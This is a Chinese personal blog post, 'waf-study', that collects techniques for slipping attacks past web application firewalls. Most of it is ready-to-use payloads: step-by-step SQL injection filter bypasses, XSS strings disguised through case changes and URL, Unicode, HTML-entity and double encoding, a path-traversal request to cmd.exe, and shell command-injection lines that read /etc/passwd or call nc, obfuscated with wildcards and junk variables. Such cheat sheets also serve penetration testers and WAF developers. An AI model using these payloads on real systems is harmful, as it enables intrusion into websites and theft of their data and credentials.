<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>waf-study | 博世的个人博客</title><meta name="keywords" content="安全杂项"><meta name="author" content="bosch"><meta name="copyright" content="bosch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0X00  Fuzz&#x2F;爆破fuzz字典 1.Seclists&#x2F;Fuzzing https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Fuzzing 2.Fuzz-DB&#x2F;Attack https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb&#x2F;tree&#x2F;master&#x2F;attack 3.Other Payloads 可能会被">
<meta property="og:type" content="article">
<meta property="og:title" content="waf-study">
<meta property="og:url" content="https://ckcah.github.io/2020/05/02/waf-study-1/index.html">
<meta property="og:site_name" content="博世的个人博客">
<meta property="og:description" content="0X00  Fuzz&#x2F;爆破fuzz字典 1.Seclists&#x2F;Fuzzing https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Fuzzing 2.Fuzz-DB&#x2F;Attack https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb&#x2F;tree&#x2F;master&#x2F;attack 3.Other Payloads 可能会被">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.pinimg.com/236x/d1/86/94/d186944fb9da1b4e080837a07cea8029.jpg">
<meta property="article:published_time" content="2020-05-02T11:02:26.000Z">
<meta property="article:modified_time" content="2022-05-01T09:03:06.301Z">
<meta property="article:author" content="bosch">
<meta property="article:tag" content="安全杂项">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.pinimg.com/236x/d1/86/94/d186944fb9da1b4e080837a07cea8029.jpg"><link rel="shortcut icon" href="https://ckcah.github.io/images/cat.jpg"><link rel="canonical" href="https://ckcah.github.io/2020/05/02/waf-study-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1fc9630d700c25378bbd9cc7b83ea3a4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-XDVEQ9NLN8"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XDVEQ9NLN8');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"GUYXF2H6BD","apiKey":"c0d60afba1b4290f43971634820e4275","indexName":"ckcah","hits":{"per_page":6},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'waf-study',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-01 17:03:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://ckcah.github.io/images/title1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">98</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">20</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> books</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.pinimg.com/236x/d1/86/94/d186944fb9da1b4e080837a07cea8029.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">博世的个人博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> books</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">waf-study</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-02T11:02:26.000Z" title="Created 2020-05-02 19:02:26">2020-05-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-01T09:03:06.301Z" title="Updated 2022-05-01 17:03:06">2022-05-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">6,565</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>37min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="waf-study"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="0X00-Fuzz-爆破"><a href="#0X00-Fuzz-爆破" class="headerlink" title="0X00  Fuzz/爆破"></a><strong>0X00  Fuzz/爆破</strong></h3><p><strong>fuzz字典</strong></p>
<p><strong>1.Seclists/Fuzzing</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing</a></p>
<p><strong>2.Fuzz-DB/Attack</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
<p><strong>3.Other Payloads 可能会被ban ip，小心为妙。</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/foospidy/payloads">https://github.com/foospidy/payloads</a></p>
<h3 id="0X01-正则绕过"><a href="#0X01-正则绕过" class="headerlink" title="0X01  正则绕过"></a><strong>0X01  正则绕过</strong></h3><p>多少waf 使用正则匹配。</p>
<h4 id="黑名单检测-bypass"><a href="#黑名单检测-bypass" class="headerlink" title="黑名单检测/bypass"></a>黑名单检测/bypass</h4><p><strong>Case</strong>: SQL 注入</p>
<h5 id="•-Step-1"><a href="#•-Step-1" class="headerlink" title="• Step 1:"></a>• Step 1:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union</span><br><span class="line">可能正则: preg_match(&#x27;/(and|or|union)/i&#x27;, $id)</span><br><span class="line">被拦截的语句: union select user, password from users</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where</span><br><span class="line">被拦截的语句: 1 || (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users limit 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 3:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit</span><br><span class="line">被拦截的语句: 1 || (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 4:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by</span><br><span class="line">被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure>

<p>• Step 5:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || 1 = 1 into outfile &#x27;result.txt&#x27;</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = &#x27;a&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 6:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || user_id is not null</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = 0x61</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = unhex(61)</span><br></pre></td></tr></table></figure>

<p>• Step 7:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) = unhex(61)</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br></pre></td></tr></table></figure>

<p>• Step 8:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex, substr</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || lpad(user,7,1)</span><br></pre></td></tr></table></figure>

<p>• Step 9:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex, substr, white space</span><br><span class="line">被拦截的语句: 1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">bypass语句: 1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>

<h3 id="0X02-混淆-编码"><a href="#0X02-混淆-编码" class="headerlink" title="0X02    混淆/编码"></a><strong>0X02    混淆/编码</strong></h3><p><strong>1. 大小写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">Bypassed: &lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</span><br><span class="line"></span><br><span class="line">标准: SELECT * FROM all_tables WHERE OWNER = &#x27;DATABASE_NAME&#x27;</span><br><span class="line">Bypassed: sELecT * FrOm all_tables whERe OWNER = &#x27;DATABASE_NAME&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>2. URL 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">被阻断语句: &lt;svG/x=&quot;&gt;&quot;/oNloaD=confirm()//</span><br><span class="line">Bypassed: %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</span><br><span class="line"></span><br><span class="line">被阻断语句: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</span><br><span class="line">Bypassed: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</span><br></pre></td></tr></table></figure>

<p><strong>3. Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;marquee onstart=prompt()&gt;</span><br><span class="line">混淆: &lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</span><br><span class="line"></span><br><span class="line">被阻断语句: /?redir=http://google.com</span><br><span class="line">Bypassed: /?redir=http://google。com (Unicode 替代)</span><br><span class="line"></span><br><span class="line">被阻断语句: &lt;marquee loop=1 onfinish=alert()&gt;x</span><br><span class="line">Bypassed: ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</span><br><span class="line"></span><br><span class="line">TIP: 查看这些说明 this and this reports on HackerOne. :)</span><br></pre></td></tr></table></figure>

<p><strong>4. HTML 实体编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标准: &quot;&gt;&lt;img src=x onerror=confirm()&gt;</span><br><span class="line">Encoded: &amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</span><br><span class="line">Encoded: &amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</span><br></pre></td></tr></table></figure>

<p><strong>5. 混合编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sometimes, WAF rules often tend to filter out a specific type of encoding.</span><br><span class="line"></span><br><span class="line">This type of filters can be bypassed by mixed encoding payloads.</span><br><span class="line"></span><br><span class="line">Tabs and newlines further add to obfuscation.</span><br></pre></td></tr></table></figure>

<p><strong>混淆</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF=&quot;h</span><br><span class="line">tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>

<p><strong>7. 双重URL编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个需要服务端多次解析了url编码</span><br><span class="line"></span><br><span class="line">标准: http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line">混淆: http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: %253Cscript%253Ealert()%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>

<p><strong>8. 通配符使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用于linux命令语句注入，通过shell通配符绕过</span><br><span class="line"></span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /???/??t /???/??ss??</span><br><span class="line">Used chars: / ? t s</span><br><span class="line"></span><br><span class="line">标准: /bin/nc 127.0.0.1 1337</span><br><span class="line">混淆: /???/n? 2130706433 1337</span><br><span class="line">Used chars: / ? n [0-9]</span><br></pre></td></tr></table></figure>

<p><strong>9. 动态payload 生成</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: &lt;script&gt;eval(&#x27;al&#x27;+&#x27;er&#x27;+&#x27;t()&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /bi&#x27;n&#x27;&#x27;&#x27;/c&#x27;&#x27;at&#x27; /e&#x27;tc&#x27;/pa&#x27;&#x27;ss&#x27;wd</span><br><span class="line"></span><br><span class="line">Bash allows path concatenation for execution.</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javascript:alert()&quot;&#x27;;&gt;</span><br><span class="line">混淆: &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:al&quot;+&quot;er&quot;+&quot;t()&quot;&#x27;;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>9. 垃圾字符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Normal payloads get filtered out easily.</span><br><span class="line">Adding some junk chars helps avoid detection (specific cases only).</span><br><span class="line">They often help in confusing regex based firewalls.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: &lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">标准: &lt;BODY onload=alert()&gt;</span><br><span class="line">混淆: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert()&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>NOTE:</strong> 上述语句可能会破坏正则的匹配，达到绕过。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;a href=javascript;alert()&gt;ClickMe</span><br><span class="line">Bypassed: &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br></pre></td></tr></table></figure>

<p><strong>10. 插入换行符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">部分waf可能会对换行符没有匹配</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src=javascript:confirm(0)&quot;&gt;</span><br><span class="line">混淆: &lt;iframe src=&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>11. 未定义变量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash 和 perl 执行脚本中加入未定义变量，干扰正则。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>TIP:</strong> 随便写个不存在的变量就好。<code>$aaaa,$sdayuhjbsad,$dad2ed</code>都可以。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Level 1 Obfuscation: Normal</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /bin/cat$u /etc/passwd$u</span><br><span class="line"></span><br><span class="line">Level 2 Obfuscation: Postion Based</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: $u/bin$u/cat$u $u/etc$u/passwd$u</span><br><span class="line"></span><br><span class="line">Level 3 Obfuscation: Random characters</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff</span><br><span class="line"></span><br><span class="line">一个精心制作的payload</span><br><span class="line"></span><br><span class="line">$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf</span><br></pre></td></tr></table></figure>

<p><strong>12. Tab 键和换行符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">大多数waf匹配的是空格不是Tab</span><br><span class="line"></span><br><span class="line">标准: &lt;IMG SRC=&quot;javascript:alert();&quot;&gt;</span><br><span class="line">Bypassed: &lt;IMG SRC=&quot; javascript:alert();&quot;&gt;</span><br><span class="line">变形: &lt;IMG SRC=&quot; jav ascri pt:alert ();&quot;&gt;</span><br><span class="line"></span><br><span class="line">标准: http://test.com/test?id=1 union select 1,2,3</span><br><span class="line">标准: http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">混淆:</span><br><span class="line"></span><br><span class="line">&lt;iframe    src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>13. Token Breakers(翻译不了 看起来说的就是sql注入闭合)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.</span><br><span class="line">Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.</span><br><span class="line">However, the request must still remain valid while using token-breakers.</span><br></pre></td></tr></table></figure>



